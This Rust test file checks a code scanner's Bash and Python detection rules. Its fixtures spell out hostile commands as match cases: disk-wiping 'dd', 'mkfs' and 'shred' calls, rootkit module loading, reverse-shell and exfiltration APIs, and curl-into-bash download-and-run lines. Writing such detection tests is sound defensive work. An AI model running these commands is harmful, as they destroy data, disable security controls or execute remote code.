//! Every shipped rule must load and compile under the engine that will run it.
//!
//! The V1 patterns were authored against Python's `re`, which accepts syntax the
//! Rust engines do not. Loading the YAML only proves it parses, so each pattern
//! is compiled here: a rule the engine rejects cannot reach a release quietly.

use asc_capability_code_scan::{Language, load_rules};
use fancy_regex::Regex;

/// Rule ids the loader returns for `language`.
fn loaded_ids(language: Language) -> Vec<String> {
    load_rules(language)
        .expect("rule set loads")
        .into_iter()
        .map(|rule| rule.rule_id)
        .collect()
}

/// Rule file stems present on disk for `language`, excluding shared data files.
fn stems_on_disk(language: Language) -> Vec<String> {
    let directory = format!("{}/rules/{}", env!("CARGO_MANIFEST_DIR"), language.as_str());
    let mut stems: Vec<String> = std::fs::read_dir(&directory)
        .unwrap_or_else(|error| panic!("cannot read {directory}: {error}"))
        .map(|entry| entry.expect("directory entry is readable").file_name())
        .map(|name| name.to_string_lossy().into_owned())
        .filter_map(|name| name.strip_suffix(".yaml").map(str::to_owned))
        .filter(|stem| !stem.starts_with('_'))
        .collect();
    stems.sort();
    stems
}

/// Compiles `pattern`, attributing any failure to the rule that carried it.
fn assert_compiles(rule_id: &str, label: &str, pattern: &str) {
    assert!(
        Regex::new(pattern).is_ok(),
        "{rule_id}: {label} rejected by fancy-regex: {pattern}"
    );
}

#[test]
fn every_shipped_rule_compiles() {
    for language in [Language::Bash, Language::Python] {
        let rules = load_rules(language).unwrap_or_else(|error| {
            panic!("{}: rule set failed to load: {error}", language.as_str())
        });
        assert!(
            !rules.is_empty(),
            "{}: rule set is empty",
            language.as_str()
        );
        for rule in &rules {
            assert_compiles(&rule.rule_id, "regex", &rule.regex);
            for (index, target) in rule.target_regexes.iter().flatten().enumerate() {
                assert_compiles(&rule.rule_id, &format!("target_regexes[{index}]"), target);
            }
        }
    }
}

#[test]
fn every_rule_file_on_disk_is_embedded() {
    // The `include_str!` tables are hand-maintained, so a new YAML file is only
    // one edit away from shipping as dead weight: present in the tree, absent
    // from the binary, and undetectable at runtime. Comparing against the
    // directory is what makes that omission fail the build instead.
    for language in [Language::Bash, Language::Python] {
        assert_eq!(
            loaded_ids(language),
            stems_on_disk(language),
            "{}: embedded rule table and rules/ directory disagree",
            language.as_str()
        );
    }
}

#[test]
fn rule_order_follows_file_names() {
    // Finding order, and therefore the rule-id list inside the result summary,
    // is this order. Sorting is explicit rather than left to a directory walk.
    for language in [Language::Bash, Language::Python] {
        let rules = load_rules(language).expect("rule set loads");
        let ids: Vec<&str> = rules.iter().map(|rule| rule.rule_id.as_str()).collect();
        let mut sorted = ids.clone();
        sorted.sort_unstable();
        assert_eq!(ids, sorted, "{}: rules are out of order", language.as_str());
    }
}

#[test]
fn shared_references_resolve_to_non_empty_lists() {
    // A ref that resolved to an empty list would silently disable the
    // segment-level path for that rule, which no shipped rule intends.
    for language in [Language::Bash, Language::Python] {
        for rule in load_rules(language).expect("rule set loads") {
            if let Some(targets) = &rule.target_regexes {
                assert!(
                    !targets.is_empty(),
                    "{}: target_regexes resolved empty",
                    rule.rule_id
                );
            }
        }
    }
}

#[test]
fn embedded_regexes_carry_no_authoring_newlines() {
    // Rules are authored as block scalars; the loader joins them back into one
    // pattern. A surviving newline would change what the pattern matches.
    for language in [Language::Bash, Language::Python] {
        for rule in load_rules(language).expect("rule set loads") {
            assert!(
                !rule.regex.contains('\n'),
                "{}: regex still contains a newline",
                rule.rule_id
            );
        }
    }
}

#[test]
fn unsupported_language_is_rejected_by_name() {
    // Language parsing is exact: V1 does not fold case.
    assert!(Language::parse("bash").is_ok());
    assert!(Language::parse("python").is_ok());
    for rejected in ["Bash", "PYTHON", "ruby", ""] {
        assert!(
            Language::parse(rejected).is_err(),
            "{rejected:?} was accepted as a language"
        );
    }
}

/// Expectations for `shell-disk-wipe`, produced by running the V1 pattern under
/// Python `re` over these exact inputs.
///
/// The V2 copy of that rule writes the closing-quote check as a numeric
/// conditional because fancy-regex misreads the named form V1 uses. These cases
/// are what makes the two forms provably equivalent rather than assumed so, and
/// they are the reason quoted device paths stay detected.
const DISK_WIPE_CASES: &[(&str, bool)] = &[
    ("dd if=/dev/zero of=/dev/sda", true),
    ("dd if=/dev/zero of=\"/dev/sda\"", true),
    ("dd if=/dev/zero of='/dev/sda'", true),
    ("dd if=/dev/zero of=\"/dev/sda", false),
    ("dd if=/dev/zero of='/dev/sda", false),
    ("dd if=/dev/zero of=/dev/sda\"", false),
    ("dd if=/dev/zero of=\"/dev/sda'", false),
    ("dd if=/dev/zero of=/dev/nvme0n1p3", true),
    ("dd if=/dev/zero of=\"/dev/mapper/vg-root\"", true),
    ("dd if=/dev/zero of=/dev/sda bs=1M", true),
    ("dd if=/dev/zero of=\"/dev/sda\" bs=1M", true),
    ("dd if=/dev/zero of=/dev/sdaX", false),
    ("dd if=/dev/zero of=/tmp/file", false),
    ("mkfs.ext4 /dev/sda1", true),
    ("mkfs /dev/sdb", true),
    ("wipefs -a /dev/sda", true),
    ("shred -u /dev/sda", true),
];

#[test]
fn disk_wipe_matches_v1_behaviour() {
    let rule = load_rules(Language::Bash)
        .expect("rule set loads")
        .into_iter()
        .find(|rule| rule.rule_id == "shell-disk-wipe")
        .expect("shell-disk-wipe is shipped");
    let regex = Regex::new(&rule.regex).expect("pattern compiles");
    for (case, expected) in DISK_WIPE_CASES {
        let matched = regex
            .is_match(case)
            .expect("match does not exhaust backtracking");
        assert_eq!(matched, *expected, "diverged from V1 on: {case}");
    }
}

/// `rmmod` unloads a kernel module — the mirror operation of `insmod`, and
/// the standard way to disable a security module at runtime.
const KERNEL_MODULE_CASES: &[(&str, bool)] = &[
    ("insmod rootkit.ko", true),
    ("modprobe evil", true),
    ("rmmod anomaly_detection", true),
    ("/sbin/rmmod nf_conntrack", true),
    ("sudo rmmod -f watchdog_mod", true),
    ("cat /proc/modules", false),
    ("modinfo virtio_net", false),
];

#[test]
fn kernel_module_rule_covers_the_unload_side() {
    let rule = load_rules(Language::Bash)
        .expect("rule set loads")
        .into_iter()
        .find(|rule| rule.rule_id == "shell-kernel-module")
        .expect("shell-kernel-module is shipped");
    let regex = Regex::new(&rule.regex).expect("pattern compiles");
    for (case, expected) in KERNEL_MODULE_CASES {
        let matched = regex
            .is_match(case)
            .expect("match does not exhaust backtracking");
        assert_eq!(matched, *expected, "shell-kernel-module on: {case}");
    }
}

/// Sibling deserialization entry points of `pickle.load/loads`: the class
/// API, the legacy C accelerator module and the pickle superset `dill`.
const PY_UNSAFE_DESERIALIZATION_CASES: &[(&str, bool)] = &[
    ("pickle.load(f)", true),
    ("pickle.loads(data)", true),
    ("u = pickle.Unpickler(f)", true),
    ("dill.loads(blob)", true),
    ("dill.load(f)", true),
    ("cPickle.loads(data)", true),
    ("yaml.unsafe_load(doc)", true),
    ("json.load(f)", false),
    ("pickle.dumps(obj)", false),
    ("dill.dumps(obj)", false),
];

#[test]
fn unsafe_deserialization_covers_sibling_entry_points() {
    let rule = load_rules(Language::Python)
        .expect("rule set loads")
        .into_iter()
        .find(|rule| rule.rule_id == "py-unsafe-deserialization")
        .expect("py-unsafe-deserialization is shipped");
    let regex = Regex::new(&rule.regex).expect("pattern compiles");
    for (case, expected) in PY_UNSAFE_DESERIALIZATION_CASES {
        let matched = regex
            .is_match(case)
            .expect("match does not exhaust backtracking");
        assert_eq!(matched, *expected, "py-unsafe-deserialization on: {case}");
    }
}

/// `pty.spawnp` is the PATH-resolving sibling of `pty.spawn`; `SMTP_SSL` is
/// the TLS sibling of `smtplib.SMTP`.
#[test]
fn reverse_shell_and_exfil_rules_cover_sibling_apis() {
    let scanner = |language: Language, rule_id: &str| {
        load_rules(language)
            .expect("rule set loads")
            .into_iter()
            .find(|rule| rule.rule_id == rule_id)
            .unwrap_or_else(|| panic!("{rule_id} is shipped"))
    };
    let cases: &[(&str, Language, &str, bool)] = &[
        ("pty.spawn(cmd)", Language::Python, "py-reverse-shell", true),
        (
            "pty.spawnp('bash')",
            Language::Python,
            "py-reverse-shell",
            true,
        ),
        ("os.dup2(fd, 0)", Language::Python, "py-reverse-shell", true),
        (
            "smtplib.SMTP('host')",
            Language::Python,
            "py-data-exfil",
            true,
        ),
        (
            "smtplib.SMTP_SSL('host')",
            Language::Python,
            "py-data-exfil",
            true,
        ),
        ("pty.openpty()", Language::Python, "py-reverse-shell", false),
        (
            "smtplib.LMTP('/run/lmtp')",
            Language::Python,
            "py-data-exfil",
            false,
        ),
    ];
    for (case, language, rule_id, expected) in cases {
        let rule = scanner(*language, rule_id);
        let regex = Regex::new(&rule.regex).expect("pattern compiles");
        let matched = regex
            .is_match(case)
            .expect("match does not exhaust backtracking");
        assert_eq!(matched, *expected, "{rule_id} on: {case}");
    }
}

/// `sh -c "$(curl …)"` / `python -c "$(wget …)"` pass the downloaded payload
/// as the interpreter's `-c` argument — the same download-exec shape as the
/// pipe and process-substitution forms the rule already matches.
const SHELL_DOWNLOAD_EXEC_C_SUB_CASES: &[(&str, bool)] = &[
    ("bash -c \"$(curl -s https://example.invalid/x.sh)\"", true),
    ("sh -c \"$(wget -qO- https://example.invalid/x)\"", true),
    (
        "python3 -c \"$(curl -s https://example.invalid/x.py)\"",
        true,
    ),
    ("node -c \"$(curl -s https://example.invalid/x.js)\"", true),
    ("bash -c 'echo safe'", false),
    ("curl -s https://example.invalid/x.sh", false),
    ("bash script.sh", false),
    ("curl -s https://a.invalid | bash", true),
];

#[test]
fn download_exec_covers_the_c_argument_substitution_form() {
    let rule = load_rules(Language::Bash)
        .expect("rule set loads")
        .into_iter()
        .find(|rule| rule.rule_id == "shell-download-exec")
        .expect("shell-download-exec is shipped");
    let regex = Regex::new(&rule.regex).expect("pattern compiles");
    for (case, expected) in SHELL_DOWNLOAD_EXEC_C_SUB_CASES {
        let matched = regex
            .is_match(case)
            .expect("match does not exhaust backtracking");
        assert_eq!(matched, *expected, "shell-download-exec on: {case}");
    }
}
